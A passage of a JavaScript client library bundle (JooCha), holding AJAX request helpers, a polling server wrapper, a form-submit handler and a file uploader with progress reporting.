			}

		}

		if(PostParams)
		{
			this.REQUEST_WINMAIN.open("POST", encodeURI(url), true);
			if(PostParams.toString().toLowerCase()=="[object formdata]"){
				var boundary="--" + Math.random().toString().substr(2);
				//this.REQUEST_WINMAIN.setRequestHeader("Content-Type","multipart/form-data; charset=UTF-8; boundary=" + boundary);
				
			}else
			if(typeof PostParams == "object"){
				this.REQUEST_WINMAIN.setRequestHeader("Content-Type","application/json; charset=UTF-8"); 
			}
			else {
				this.REQUEST_WINMAIN.setRequestHeader("Content-Type","application/x-www-form-urlencoded; charset=UTF-8"); 
			}
			//console.log(PostParams);
			this.REQUEST_WINMAIN.send(PostParams);
		}
		else
		{
			this.REQUEST_WINMAIN.open("GET", encodeURI(url), true);
			this.REQUEST_WINMAIN.setRequestHeader("Content-Type","application/x-www-form-urlencoded; charset=UTF-8"); 
			this.REQUEST_WINMAIN.send(null);
		}
		
	}
}

//-------------------------=======================================-----------------------
this.SendQuerySrv=function SendQuerySrv(gnm,url) //PUBLIC
{
   this.SendQuery(gnm,url,'');
}

//-------------------------=======================================-----------------------
this.Query=function Query(url,RetPrc,PostParams) //PUBLIC
{
   this.SendQuery('',url,RetPrc,PostParams);
}


}//end Class
//--=====================================================================
function getJoinValue(elname,tablename,fnm,vid,returnfields,RetPrc)
{
	   var sr=new SendRecv();
	   sr.SendQuery(elname,"?phpParam=getfield.php&"+SIDNAME+"="+SID+"&tabnm="+tablename+"&gc="+$tablename+"&gcuid="+vid+"&fieldname="+fnm+"&collumn="+returnfields+"&token="+GLOB_SEND_ID,RetPrc);
}
//--=====================================================================
function getTableValue(elname,tablename,fnm,vid,returnfields,RetPrc)
{
	   var sr=new SendRecv();
	   sr.SendQuery(elname,"?phpParam=getfield.php&"+SIDNAME+"="+SID+"&tabnm="+tablename+"&gc="+$tablename+"&gcuid="+vid+"&fieldname="+fnm+"&collumn="+returnfields+"&token="+GLOB_SEND_ID,RetPrc);
}
//--=====================================================================
function getRequest(elname,url,RetPrc,xmlProc)
{
	   var sr=new SendRecv();
	   if(xmlProc)sr.PROCXML=xmlProc;
	   sr.SendQuery(elname,url+"&"+SIDNAME+"="+SID+"&token="+GLOB_SEND_ID,RetPrc);
}

//-------------------------=======================================-----------------------
function SendQuery(gnm,url,RetPrc,PostParam) //PUBLIC
{
	if(!RetPrc)RetPrc="";
	if(!PostParam)PostParam="";
    GLOB_SEND_ID++;
    var ss=new SendRecv();
    ss.SendQuery(gnm,url,RetPrc,PostParam);
}


//------------------------------------------------------
//------------------------------------------------------
function SendQuerySrv(gnm,url) //PUBLIC
{
   SendQuery(gnm,url,'');
};
//---------------===============================----------------------
//-------------------------=======================================-----------------------
var REQUEST_WINMAIN_ARR=new Array();
var SEND_WINNAME_ARR=new Array();

function InitializeIndex(indx)
{
if(REQUEST_WINMAIN_ARR[indx])return REQUEST_WINMAIN_ARR[indx];
	try
	{
		REQUEST_WINMAIN_ARR[indx]=new ActiveXObject("Msxml2.XMLHTTP");
	}
	catch(e)
	{
		try
		{
			REQUEST_WINMAIN_ARR[indx]=new ActiveXObject("Microsoft.XMLHTTP");
		}
		catch(oc)
		{
			REQUEST_WINMAIN_ARR[indx]=null;
		}
	}

	if(!REQUEST_WINMAIN_ARR[indx]&&typeof XMLHttpRequest!="undefined")
	{
		REQUEST_WINMAIN_ARR[indx]=new XMLHttpRequest();
	}

};
//---------------===============================----------------------
function SendQueryIndex(gnm,url,RetPrc,indx) //PUBLIC
{
        InitializeIndex(indx);
	if(REQUEST_WINMAIN_ARR[indx]!=null)
	{
                if(!(SEND_WINNAME_ARR[indx]=document.getElementById(gnm)))SEND_WINNAME_ARR[indx]=gnm;
		REQUEST_WINMAIN_ARR[indx].onreadystatechange = RetPrc;
		REQUEST_WINMAIN_ARR[indx].open("GET", encodeURI(url), true);
		REQUEST_WINMAIN_ARR[indx].setRequestHeader("Content-Type","application/x-www-form-urlencoded; charset=UTF-8"); 
		REQUEST_WINMAIN_ARR[indx].send(null);
	}else alert('Not Send');
}
//---------------===============================----------------------
var QFrameUID=1;
function CraeteNewQueryFrame(url)
{
    var doc=SelfDocument;
    if(FireHandleParent)doc=ParentDocument;
    var luid=QFrameUID++
    var nameid="QFrame_".luid;

    var frm=doc.createElement("iframe");
    frm.UNSELECTABLE=true;
    frm.style.position='absolute';
    frm.style.left=-1000;
    frm.style.top=-1000;
    frm.style.width=100;
    frm.style.height=100;
    frm.zIndex=-20000;
    frm.style.float='left';
    frm.style.clear='none';
    frm.style.border='none';
    frm.style.margin=0;
    frm.style.padding=0;
    frm.src=url;
    frm.id=nameid;
    frm.name=nameid;

    doc.body.appendChild(frm);

return nameid;
}
//---------------===============================----------------------
function LoadToQueryFrame(frmid,url)
{
   var frmattr=GetFrameAttr(frmid);
   frmattr.FrameObject.src=url;
return frmattr;
}
//---------------===============================----------------------
function GetElementFromQueryFrame(frmid,elname)
{
   var frmattr=GetFrameAttr(frmid);
   var doc=frmattr.FrameDocument;
   return doc.getElementById(elname);
}
//---------------===============================----------------------
function ReplaceElementFromQueryFrame(frmid,url,elname)
{
    LoadToQueryFrame(frmid,url);
    var elobj=GetElementFromQueryFrame(frmid,elname);
    var elcur=document.getElementById(elname);
    return elcur.replaceNode(elobj);

}


/* jc_sendrecv.js */

/**
 * js_sendrecv - JavaScript JooCha Library
 *
 * Form data send and receiver bettwen client and server side with AJAX
 * 
 * @link    http://joocha.com
 * @license For open source use: GPLv3
 *          For commercial use: Commercial License
 * @author  John Chavchanidze
 * @version 1.0.1
 *
 * See usage examples at http://joocha.com/examples
 */
 
var jcfSendRecvCounter=0;
var jcfServerCounter=0;
var jcfHistory={"data":[{"url":'',"method":'get',"local":'',"sub":{}}],"index":0};


function jcfSendRecv()
{
var local=this;
this.REQUEST_WINMAIN;
this.REQUEST_UPLOADER;
/*event on recv*/
this.PROCTEXT='';
this.PROCXML='';
this.PROCJSON='';
this.PROCRESPONSE='';
this.Waiting=false;
this.WaitingWindow=function(){WaitingWindow();};

this.Sleeping=5000;
this.debug=false;
this.Socket=null;
this.jcfServers=[];
//-------------------------=======================================-----------------------
this.Initialize=function Initialize()
{
	try
	{
		local.REQUEST_WINMAIN=new ActiveXObject("Msxml2.XMLHTTP");
	}
	catch(e)
	{
		try
		{
			local.REQUEST_WINMAIN=new ActiveXObject("Microsoft.XMLHTTP");
		}
		catch(oc)
		{
			local.REQUEST_WINMAIN=null;
		}
	}

	if(!local.REQUEST_WINMAIN&&typeof XMLHttpRequest!="undefined")
	{
		local.REQUEST_WINMAIN=new XMLHttpRequest();
	}
	if(!local.REQUEST_UPLOADER)local.REQUEST_UPLOADER=new XMLHttpRequest();
}
//-------------------------=======================================-----------------------
local.Initialize();
//-------------------------=======================================-----------------------
function loadXMLDoc(filename)
{
  if (window.ActiveXObject)
  {
	xhttp = new ActiveXObject("Msxml2.XMLHTTP");
  }
  else
  {
	xhttp = new XMLHttpRequest();
  }
  
  xhttp.open("GET", filename, false);
  try {xhttp.responseType = "msxml-document"} catch(err) {console.log("LoadXML Error: "+err.toString());} // Helping IE11
  xhttp.send("");
return xhttp.responseXML;
}
//-------------------------=======================================-----------------------
function displayXMLResult(xmlFile,xslFile,resultTag)
{
  var xml = loadXMLDoc(xmlFile);
  var xsl = loadXMLDoc(xslFile);

  // code for IE
  if (window.ActiveXObject || xhttp.responseType == "msxml-document")
  {
	var ex = xml.transformNode(xsl);
	document.getElementById(resultTag).innerHTML = ex;
  }
  // code for Chrome, Firefox, Opera, etc.
  else if (document.implementation && document.implementation.createDocument)
  {
     var xsltProcessor = new XSLTProcessor();
     xsltProcessor.importStylesheet(xsl);
     var resultDocument = xsltProcessor.transformToFragment(xml, document);
     document.getElementById(resultTag).appendChild(resultDocument);
  }
}
//-------------------------=======================================-----------------------
this.SendQuery=function SendQuery(url,PostParams) //PUBLIC
{
	var blprc=0;
	local.Waiting=true;
	
	if(!PostParams)PostParams="";
	var nObj=new Object();
	nObj={"url":url,"method":(PostParams.length>0?'post':'get'),"local":local};
	jcfHistory.data.push(nObj);
	
    jcfSendRecvCounter++;
	local.Initialize();
	if(local.REQUEST_WINMAIN!=null)
	{
		local.REQUEST_WINMAIN.onreadystatechange = function ()
		{
			var lStatus={"code":0,"text":"","done":0};
			
			try{
				if (local.REQUEST_WINMAIN.readyState == 4)
					{
						if (local.REQUEST_WINMAIN.status == 200)
						{
							blprc=1;
							lStatus.done=1;
						}
						else
						{
							local.Waiting=false;
							if(local.Socket)local.Socket["status"]=0;
						}
						lStatus.code=local.REQUEST_WINMAIN.status;
						lStatus.text=local.REQUEST_WINMAIN.responseText;
					}
			}
			catch(e)
			{
				errorCode="ErrBrowserVersion";
				console.log("ErrBrowserVersion");	
			}
			
			if(blprc)
			{
			
				local.Waiting=2;
			   if(local.PROCTEXT)
			   {
			    var txt=local.REQUEST_WINMAIN.responseText;
				if(txt.length>0)
				{
					try{
						local.PROCTEXT(txt,lStatus);
					}catch(e)
					{
						local.PROCTEXT("");
						if(lStatus.code>=300){MessageBox('Send-receive Error: (code: '+lStatus.code+') ','Send-receive error::','MB_OK');}
					}
				}else local.PROCTEXT("");
				
			   }
			   
				/* auto detect content type if json then break xml parsing*/
			   if(local.PROCXML)
			   {
                    var txt=local.REQUEST_WINMAIN.responseText;
					try{
						if((trim(txt).indexOf("{")===0) && ((!local.PROCJSON) || (local.PROCJSON==undefined))){
							local.PROCJSON=local.PROCXML;
							local.PROCXML="";
						}
					}catch(e){
					}
				}
			   
			   if(local.PROCXML)
			   {
                    var txt=local.REQUEST_WINMAIN.responseText;
					var ck=true;
                    if (window.DOMParser)
                    {
					try{
						parser=new DOMParser();
						xmlDoc=parser.parseFromString(txt,"text/xml");
						ck=false;
					  }catch(e)
					  {
						ck=true;
					  }
                    }
                    if(ck) // Internet Explorer
                    {
                      xmlDoc=new ActiveXObject("Microsoft.XMLDOM");
                      xmlDoc.async=false;
                      xmlDoc.loadXML(txt);
                    } 
			        if(xmlDoc && txt.length>0){//local.PROCXML(xmlDoc);
						try{
							local.PROCXML(xmlDoc,lStatus);
						}catch(e){
							if(lStatus.code>=300){
								MessageBox('Send-receive Error: (code: '+lStatus.code+') ','Send-receive error::','MB_OK');
							}
							local.PROCXML(xmlDoc);
						}
					
					}
			   }
			   
			   //JSON Proceduris gamodzaxeba
			   if(local.PROCJSON)
			   {

                    var txt=local.REQUEST_WINMAIN.responseText;
					var jo=null;
					
					try{
						jo=JSON.parse(txt);
					  }catch(e)
					  {
						console.log("ProcJSON Error: "+ e.toString());
					  }
					  
                    if(jo && txt.length>0){//local.PROCJSON(jo);
						try{
							local.PROCJSON(jo,lStatus);
						}catch(e){
							if(lStatus.code>=300){
								MessageBox('Send-receive Error: (code: '+lStatus.code+') ','Send-receive error::','MB_OK');
							}
							local.PROCJSON(jo);
						}
					
					}
			    }
			   
			   
			   //droebitia, dasamushavebelia
			   if(local.PROCHTML)
			   {
                    var txt=local.REQUEST_WINMAIN.responseText;
					var ck=true;
                    if (window.DOMParser)
                    {
					try{
						parser=new DOMParser();
						xmlDoc=parser.parseFromString(txt,"text/html");
						ck=false;
					  }catch(e)
					  {
						ck=true;
					  }
                    }
                    
					if(ck)// Internet Explorer
                    {
                      xmlDoc=new ActiveXObject("Microsoft.HTMLDOM");
                      xmlDoc.async=false;
                      xmlDoc.loadXML(txt);
                    } 
					if(xmlDoc && txt.length>0){//local.PROCHTML(xmlDoc);
						try{
							local.PROCXML(xmlDoc,lStatus);
						}catch(e){
							if(lStatus.code>=300){
								MessageBox('Send-receive Error: (code: '+lStatus.code+') ','Send-receive error::','MB_OK');
							}
							local.PROCXML(xmlDoc);
						}
					}
			   }
			   
			   if(local.PROCRESPONSE)
			   {
			       var reqret=local.REQUEST_WINMAIN;
			       //local.PROCRESPONSE(reqret);
					try{
						local.PROCRESPONSE(reqret,lStatus);
					}catch(e){
						if(lStatus.code>=300){
							MessageBox('Send-receive Error: (code: '+lStatus.code+') ','Send-receive error::','MB_OK');
						}
						local.PROCRESPONSE(reqret);
					}
			   }
			   
			   local.Waiting=false;
			   if(local.Socket)local.Socket["status"]=0;
			}
			
			try{
			if(local.WaitingWindow)winclose(local.WaitingWindow);
			}catch(e){};
			

		}
		

		if(PostParams)
		{
			local.REQUEST_WINMAIN.open("POST", encodeURI(url), true);
			if(PostParams.toString().toLowerCase()=="[object formdata]"){
				var boundary="--" + Math.random().toString().substr(2);
				//this.REQUEST_WINMAIN.setRequestHeader("Content-Type","multipart/form-data; charset=UTF-8; boundary=" + boundary); 
			}else
			if(typeof PostParams == "object"){
				this.REQUEST_WINMAIN.setRequestHeader("Content-Type","application/json; charset=UTF-8"); 
			}
			else {
				this.REQUEST_WINMAIN.setRequestHeader("Content-Type","application/x-www-form-urlencoded; charset=UTF-8"); 
			}

			//console.log(PostParams);
			local.REQUEST_WINMAIN.send(PostParams);
		}
		else
		{
			local.REQUEST_WINMAIN.open("GET", encodeURI(url), true);
			local.REQUEST_WINMAIN.setRequestHeader("Content-Type","application/x-www-form-urlencoded; charset=UTF-8"); 
			
			/*local.REQUEST_WINMAIN.setRequestHeader("Upgrade","websocket"); 
			local.REQUEST_WINMAIN.setRequestHeader("Connection","Upgrade"); 
			local.REQUEST_WINMAIN.setRequestHeader("Sec-WebSocket-Key","JooChaEngine=="); 
			local.REQUEST_WINMAIN.setRequestHeader("Sec-WebSocket-Protocol","chat"); 
			local.REQUEST_WINMAIN.setRequestHeader("Sec-WebSocket-Version","13");*/
			
			local.REQUEST_WINMAIN.send(null);
		}
		
	}
}
//-------------------------=======================================-----------------------
this.Upload=function Upload(url,PostParams) //PUBLIC
{
	var blprc=0;
	local.Waiting=true;
	
	if(!PostParams)PostParams="";
	var nObj=new Object();
	nObj={"url":url,"method":(PostParams.length>0?'post':'get'),"local":local};
	jcfHistory.data.push(nObj);
	
    jcfSendRecvCounter++;
	local.Initialize();
	if(local.REQUEST_UPLOADER!=null)
	{
		if(PostParams)
		{
			local.REQUEST_UPLOADER.open("POST", encodeURI(url), true);
			if(PostParams.toString().toLowerCase()=="[object formdata]"){
			}
			if(typeof PostParams == "object"){
			}
			else {
				this.REQUEST_UPLOADER.setRequestHeader("Content-Type","application/x-www-form-urlencoded; charset=UTF-8"); 
			}

			//console.log(PostParams);
			local.REQUEST_UPLOADER.send(PostParams);
		}
		else
		{
			local.REQUEST_UPLOADER.open("GET", encodeURI(url), true);
			local.REQUEST_UPLOADER.setRequestHeader("Content-Type","application/x-www-form-urlencoded; charset=UTF-8"); 
			local.REQUEST_UPLOADER.send(null);
		}
		
	}

}
//-------------------------=======================================-----------------------
this.actionServer=function actionServer(vId)
{
	var aId=local.selectServer(vId);
	if(local.jcfServers[aId]["status"]==0)
	{
		local.jcfServers[aId]["status"]=1;
		local.jcfServers[aId]["SR"].Socket=local.jcfServers[aId];
		local.jcfServers[aId]["SR"].SendQuery(local.jcfServers[aId]["url"]);
	}
}
//-------------------------=======================================-----------------------
this.actionStart=function actionStart(vId)
{
	local.actionStop(vId);
	var aId=local.selectServer(vId);
	
	local.jcfServers[aId]["SR"].PROCJSON=null;
	local.jcfServers[aId]["SR"].PROCXML=null;
	local.jcfServers[aId]["SR"].PROCHTML=null;
	local.jcfServers[aId]["SR"].PROCTEXT=null;
	local.jcfServers[aId]["SR"].PROCRESPONSE=null;
	
		if(typeof local.jcfServers[aId]["procedure"] === 'object')
		{
		    if(local.jcfServers[aId]["procedure"]["type"].toLowerCase()=="json")
					local.jcfServers[aId]["SR"].PROCJSON=local.jcfServers[aId]["procedure"]["handle"];
			else
		    if(local.jcfServers[aId]["procedure"]["type"].toLowerCase()=="xml")
					local.jcfServers[aId]["SR"].PROCXML=local.jcfServers[aId]["procedure"]["handle"];
			else
		    if(local.jcfServers[aId]["procedure"]["type"].toLowerCase()=="html")
					local.jcfServers[aId]["SR"].PROCHTML=local.jcfServers[aId]["procedure"]["handle"];
			else
		    if(local.jcfServers[aId]["procedure"]["type"].toLowerCase()=="text")
					local.jcfServers[aId]["SR"].PROCTEXT=local.jcfServers[aId]["procedure"]["handle"];
			else
				local.jcfServers[aId]["SR"].PROCRESPONSE=local.jcfServers[aId]["procedure"]["handle"];
		}else
		{
			local.jcfServers[aId]["SR"].PROCRESPONSE=local.jcfServers[aId]["procedure"];
		}
	
	
	eval(local.jcfServers[aId]["action"]);
}
//-------------------------=======================================-----------------------
this.actionStop=function actionStop(vId)
{
	var aId=local.selectServer(vId);
	if(local.jcfServers[aId]["processId"])
		clearInterval(local.jcfServers[aId]["processId"]);
}

//-------------------------=======================================-----------------------
this.selectServer=function selectServer(vId)
{
	for(var i=0;i<this.jcfServers.length;i++)
	{
		if(this.jcfServers[i]["id"]==vId)return i;
	}
	return null;
}
//-------------------------=======================================-----------------------
this.openServer=function openServer(url,proc)//proc={"type":"text","handle":function(txt){console.log(txt);}}
{
	if(!url)return null;
	if(!proc)proc=null;
	
	var vId=jcfServerCounter++
	var obj={"url":url,
				"id":vId,
				"SR":new jcfSendRecv(),
				"processId":null,
				"action":"var aId=local.selectServer('"+vId+"');local.jcfServers[aId].processId=setInterval(function(){local.actionServer("+vId+");},"+local.Sleeping+");",
				"status":0,
				"procedure":proc};
	
	local.jcfServers.push(obj);
	local.actionStart(vId);
return vId;
}
//-------------------------=======================================-----------------------

}
//-------------------------------------------------------
//------ Procedures ---------------
function dataSender(url,aValues,vCallBack,removal,callbackType)
{
	var PostParams="";
		if(aValues && aValues.toString && aValues.toString().toLowerCase()=="[object formdata]")
		{
			PostParams=aValues;
		}
		else
		if(Array.isArray(aValues) || typeof aValues =="object")
		{
			try{
				for(var i=0;i<aValues.length;i++)
				{
					if(aValues[i][2] && aValues[i][2]==1)
					PostParams=PostParams+'&'+aValues[i][0]+'='+aValues[i][1];
					else
					PostParams=PostParams+'&'+aValues[i][0]+'='+encodeURIComponent(aValues[i][1]);
				}
			}catch(e){
				for(var ky in aValues)
				if(aValues.hasOwnProperty(ky)){
					PostParams=PostParams+'&'+ky+'='+encodeURIComponent(aValues[ky]);
				}
			}
		}
		else
		{
		    //aValues=aValues.replace(/\&[a-zA-Z0-9]*_fnc=[^\&]*/g,"").replace(/\&[a-zA-Z0-9]*_req=[^\&]*/g,"").replace(/\&[a-zA-Z0-9]*uid=[^\&]*/g,"").replace(/\&id=[^\&]*/g,"").replace(/\&sid=[^\&]*/g,"").replace(/\&tabnm=[^\&]*/g,"");
			if(aValues){
				if(!removal)removal=[];
				if(removal.indexOf('fnc')!=-1)aValues=aValues.replace(/\&[a-zA-Z0-9_]*_fnc=[^\&]*/g,"");
				if(removal.indexOf('req')!=-1)aValues=aValues.replace(/\&[a-zA-Z0-9_]*_req=[^\&]*/g,"");
				if(removal.indexOf('uid')!=-1)aValues=aValues.replace(/\&[a-zA-Z0-9_]*uid=[^\&]*/g,"");
				if(removal.indexOf('id')!=-1)aValues=aValues.replace(/\&id=[^\&]*/g,"");
				if(removal.indexOf('sid')!=-1)aValues=aValues.replace(/\&sid=[^\&]*/g,"");
				if(removal.indexOf('tabnm')!=-1)aValues=aValues.replace(/\&tabnm=[^\&]*/g,"");
				if(removal.indexOf('phpParam')!=-1)aValues=aValues.replace(/\&phpParam=[^\&]*/g,"");
				//for(var i=0;i<removal.length;i++)aValues=aValues.replace("/\&"+removal[i]+"=[^\&]*/g","");
			}
									
			if(aValues)PostParams="&"+aValues;
		}
	var sr=new jcfSendRecv();
	if(!callbackType)callbackType='';
	if(vCallBack)
	switch(callbackType)
	{
		case "json":sr.PROCJSON=vCallBack;break;
		case "xml":sr.PROCXML=vCallBack;break;
		case "html":sr.PROCHTML=vCallBack;break;
		default:sr.PROCTEXT=vCallBack;
	}
	sr.SendQuery(url,PostParams);
		
}
//------------------------
function jc_formSubmit(formIdOrObject)
{
var local=this;
this.formObject=formIdOrObject;
if(typeof this.formObject =="string")this.formObject=document.getElementById(this.formObject);

this.type="";//private
this.action="";//public from attribute
this.readdress="";
this.msgBlockId="";
this.butId="";

	this.submitCallBack=function submitCallBack(dat){
	  var msg= document.getElementById(local.msgBlockId);
	  if(msg){
	   if(dat.status=="ok"){
		   delClass(msg,"ERROR");
		   addClass(msg,"OK");
	    }else {
		   delClass("OK");
		   addClass(msg,"ERROR");
	    }
		msg.innerHTML=dat.description;
	  }
	  if(local.readdress){
		reloadPage(local.readdress);
	  }
	  CloseWaitingEx();
	}
	
	this.init=function init(){
		local.type="json";
		//if(local.formObject.getAttribute("data-type"))local.type=local.formObject.getAttribute("data-type");
		local.action="?";
		if(local.formObject.getAttribute("action"))local.action=local.formObject.getAttribute("action");
		console.log(local.action);
		local.readdress="";
		if(local.formObject.getAttribute("data-readdress"))local.readdress=local.formObject.getAttribute("data-readdress");
		local.msgBlockId="msg";
		if(local.formObject.getAttribute("data-msgBlockId"))local.msgBlockId=local.formObject.getAttribute("data-msg");
		local.butId="";
		if(local.formObject.getAttribute("data-submit"))local.butId=local.formObject.getAttribute("data-submit");
		
		AddEventOnObject(local.formObject,"submit",function (ev){
		   var e=ev || window.event, th=this;
		   OpenWaitingEx();
		   dataSender(getLinkEx(local.action),serialize(local.formObject),local.submitCallBack,false,local.type);
		   return formEventDisableEx(e);
		});
		
		var els=local.formObject.getElementsByTagName("input");
		for(var i=0;i<els.length;i++)if(els[i].type.toLowerCase()=="submit"){
			AddEventOnObject(els[i],"click",local._submit);
		}
		
		if(local.butId)AddEventOnObject(local.butId,"click",local._submit);
	}
	
	this._submit=function _submit(ev){
		   var e=ev || window.event, th=this;
		   OpenWaitingEx();
		   dataSender(getLinkEx(local.action),serialize(local.formObject),local.submitCallBack,false,local.type);
		   return formEventDisableEx(e);
	}
	
	this.send=function send(url,serialStr,cb,removal,cbtype){
		if(!url || url==undefined)url=getLinkEx(local.action);
		if(!serialStr  || serialStr==undefined)serialStr=serialize(local.formObject);
		if(!cb || cb==undefined)cb=local.submitCallBack;
		if(removal==null || removal==undefined)removal=false;
		if(cbtype==null || cbtype==undefined)cbtype=local.type;
		dataSender(url,serialStr,cb,removal,cbtype);
	}
	

	local.init();

}


//=================================================
//=================================================
//=================================================
	function FileUpload()
    {
        var local=this;
		this.ObjectName;
		this.Owner=document;
		this.SubFolder;
		this.InputObject;
		this.PFile=0;
		this.PFD=0;
		this.FileName='';
		this.FileSize='';
		this.FileSizeInByte='';
		this.FileType='';
		this.ProgressBar='';
		this.classProgressBar='';
		this.ProgressNumber='';
		this.infoBar='';
		
		this.InfFileName='';
		this.InfFileSize='';
		this.InfFileType='';
		this.InfProgressBar='';
		this.InfProgressNumber='';
		this.InfoBarID='';
		
		this.procProgress='';
		this.procCancel='';
		this.procFailed='';
		this.procComplete='';
		
		this.procParams='';
		
		this.ServerSide=(FullWebLink || '')+'?phpParam=uploading_server_rest&type=json';
		
		this.xhr=0;
		
		this.fileSelected=function fileSelected(IdName)
		{
			if(typeof IdName=="object"){
				local.ObjectName=IdName.name;
				local.InputObject=IdName;
				local.SubFolder=document.getElementById(local.ObjectName+"_dir");
			}
			else {
				local.ObjectName=IdName;
				local.InputObject=document.getElementById(local.ObjectName);
				local.SubFolder=document.getElementById(local.ObjectName+"_dir");
			}

			var o,fileSize = 0;
			
			if(local.InfFileName)if(o=document.getElementById(local.InfFileName))o.innerHTML ='Name: ';
			if(local.InfFileSize)if(o=document.getElementById(local.InfFileSize))o.innerHTML ='Size: ';
			if(local.InfFileType)if(o=document.getElementById(local.InfFileTyp))o.innerHTML ='Type: ';
			
			if(local.InputObject)
			 if(local.InputObject.files){
			    local.PFile=local.InputObject.files;

				for(var i in local.PFile){
					var file=local.PFile[i];
					if (file.name){
						if (file.size > 1024 * 1024)
							fileSize = (Math.round(file.size * 100 / (1024 * 1024)) / 100).toString() + 'MB';
						else
							fileSize = (Math.round(file.size * 100 / 1024) / 100).toString() + 'KB';
						console.log(file.name);
						local.FileSize=fileSize;
						local.FileName=file.name;
						local.FileType=file.type;
						local.FileSizeInByte=file.size;
						
						if(local.InfFileName)if(o=document.getElementById(local.InfFileName))o.innerHTML +=  file.name+'; ';
						if(local.InfFileSize)if(o=document.getElementById(local.InfFileSize))o.innerHTML += fileSize+'; ';
						if(local.InfFileType)if(o=document.getElementById(local.InfFileTyp))o.innerHTML += file.type+'; ';
						//alert(local.FileName+' '+local.FileSize+' '+local.FileType);
					}
				};
			
			};
			 			
			
            if(local.InfProgressBar)if(o=document.getElementById(local.InfProgressBar))local.ProgressBar=o;
            if(local.InfProgressNumber)if(o=document.getElementById(local.InfProgressNumber))local.ProgressNumber=o;
			if(local.InfoBarID)if(o=document.getElementById(local.InfoBarID))local.InfoBar=o;
			
			local.setProgressPosition(0);
		}
		
		
        this.uploadFile=function uploadFile() 
		{
		    //alert(local.ObjectName+' '+local.PFile);
            if(BrowserTypeIdx!="IE")
			{
			   var fd=new FormData();
			   for(var i in local.PFile){
					var file=local.PFile[i];
					if(file.name){
						fd.append(local.ObjectName, file);
					};
				}
			   
			   if(local.SubFolder)fd.append(local.ObjectName+"_dir", local.SubFolder.value);
			   
               xhr = new jcfSendRecv();
			   xhr.Initialize();
			   //console.log(local.uploadProgress);
               xhr.REQUEST_UPLOADER.upload.addEventListener("progress", local.uploadProgress, false);
               xhr.REQUEST_UPLOADER.addEventListener("load", local.uploadComplete, false);
               xhr.REQUEST_UPLOADER.addEventListener("error", local.uploadFailed, false);
               xhr.REQUEST_UPLOADER.addEventListener("abort", local.uploadCanceled, false);
               xhr.Upload(local.ServerSide,fd);
			}
			else
			{
			    CreateFormData("alert('Current Browser or Browser Version not support. Please update release or change this one.');");
			}
        }
		
		this.setProgressPosition=function setProgressPosition(percentComplete)
		{
			if(local.ProgressNumber)local.ProgressNumber.innerHTML = percentComplete.toString() + '%';
			if(local.ProgressBar)local.ProgressBar.value = percentComplete;
			if(local.InfoBar)local.InfoBar.innerHTML=percentComplete.toString() + '%';				
		
			if(local.classProgressBar){
				var els;
				if(local.Owner.getElementsByTagName)els=local.Owner.getElementsByTagName("progress");
				else els=document.getElementsByTagName("progress");
				for(var i=0;i<els.length;els++){
					var r=new RegExp("([ ]|^)"+local.classProgressBar+"([ ]|$)", "gm");
					if(r.test(els[i].className)){els[i].value = percentComplete;}
				}
			}		
		}
		
        this.uploadProgress=function uploadProgress(evt) 
		{
            if (evt.lengthComputable)
			{
                var percentComplete = Math.round(evt.loaded * 100 / evt.total);
				local.setProgressPosition(percentComplete);
            }
            else 
			{
                if(local.ProgressNumber)local.ProgressNumber.innerHTML = 'NEW unable to compute';
            }
			if(local.procProgress)local.procProgress(evt,local.procParams);
        }

        this.uploadComplete=function uploadComplete(evt) {
            /* This event is raised when the server send back a response */
			local.setProgressPosition(100);
			if(local.InfoBar)local.InfoBar.innerHTML='Uploaded';
			if(local.procComplete)local.procComplete(evt,local.procParams);
        }

        this.uploadFailed=function uploadFailed(evt) {
            //alert("NEW There was an error attempting to upload the file.");
			if(local.InfoBar)local.InfoBar.innerHTML='Failed';
			if(local.procFailed)local.procFailed(evt,local.procParams);
        }

        this.uploadCanceled=function uploadCanceled(evt) {
            //alert("NEW The upload has been canceled by the user or the browser dropped the connection.");
			if(local.InfoBar)local.InfoBar.innerHTML='Canceled';
			if(local.procCanceled)local.procCanceled(evt,local.procParams);
        }
		
        this.abort=function abort() {
		    if(local.xhr.REQUEST_WINMAIN)local.xhr.REQUEST_WINMAIN.abort();
        }
		
		
		
	}

//==================================================	
		function jcs_GetXML(evt)
		{
		    var xmlDoc;
			var txt=evt.target.responseText;
			var ck=true;
			if(!txt) return null;

			if (window.DOMParser)
			{
				try{
				parser=new DOMParser();
				xmlDoc=parser.parseFromString(txt,"text/xml");
				ck=false;
				}catch(e){
				ck=true;
				}
			}
			if(ck) // Internet Explorer
			{
				xmlDoc=new ActiveXObject("Microsoft.XMLDOM");
				xmlDoc.async=false;
				xmlDoc.loadXML(txt);
			} 
			return xmlDoc;

		}
//==================================================	
		/*
		ProgressBar,InfoBar,procProgress,procComplete,procFailed,procCanceled,Params,ServerSide
		*/
		function simpleUploader(filenm,vParams)
		{
		   var o=new FileUpload();
		   var flb;
		   if(typeof filenm =="object")flb=filenm;
		   else flb=document.getElementById(filenm);

		   if(typeof vParams=="object"){
				for(var pnt in vParams){
					o[pnt]=vParams[pnt];
				}
			}
			
	       o.fileSelected(flb);
	       o.uploadFile();
		}
		
	

//==================================================	
		function jcs_Uploader(parnm)
		{
		   var o=new FileUpload();
		   var bj=document.getElementById(parnm);
		   var prgs=bj.getElementsByClassName('ProgressB');
		   var infb=bj.getElementsByClassName('InfoB');
		   var flb=bj.getElementsByClassName('FileB');
		   var nm=0;
		   if(flb)if(flb[0])if(flb[0].id)nm=flb[0].id;
		   if(nm)
		   {
		       if(prgs)o.ProgressBar=prgs[0];
		       if(infb)o.InfoBar=infb[0];
		       o.fileSelected(nm);
		       o.uploadFile();
			}else
			   alert('Not find File element '+nm);
		}

/*
	<div id="fileUploader1">
    <input class="FileB" type="file" name="fileToUpload" id="fileToUpload" onchange="jcs_Uploader('fileUploader1');" />
    <div class="InfoB">    </div>
    <progress class="ProgressB" id="prog" value="0" max="100.0" style="color:black;font-size:14px;"></progress>
	</div>

*/

//==================================================
function uniqTimeout()
{
	var local=this;
	this.uniqID;

	this.uniqTimeout=function uniqTimeout()
	{
		local.uniqID=0;
	}
	
	this.call=function call(prc,vl)
	{
		if(!vl)vl=1000;
		if(local.uniqID)clearTimeout(local.uniqID);
		local.uniqID=setTimeout(prc,vl);	
	}
}
//==================================================
/*
var v=new uniqTimeout();
onkeypress=v.call(function(){},1000)
*/


/* jc_storage.js */

/*Data Modeling*/
var jdmPerson={"id":1,"PersonalID":"","firstName":"","lastName":"","birthDate":"2000-01-01","mobilePhone":"","eMail":""};
jcfListCounter=0;

